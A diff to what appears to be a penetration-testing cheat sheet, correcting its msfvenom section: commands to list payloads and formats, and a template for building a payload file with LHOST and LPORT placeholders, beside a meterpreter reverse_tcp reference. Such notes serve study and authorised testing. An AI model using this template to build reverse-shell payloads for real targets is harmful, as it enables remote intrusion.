@@ -481,13 +481,14 @@ linux/x86/meterpreter/reverse_tcp
 
 ```
 msfvenom
-msfvenom --list payload
+msfvenom --list payloads
+msfvenom --list formats
 
-msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>.<format>
 ```
 - `<architecture>`: `x86`, `x64`
-- `<payload>`: Pick your poison
-- `<format>`: `exe`, `aspx`
+- `<payload>`: Pick your poison from `msfvenom --list payloads`
+- `<format>`: Pick your poison from `msfvenom --list formats`
 
 ## ProFTPD 1.3.3c
 ```
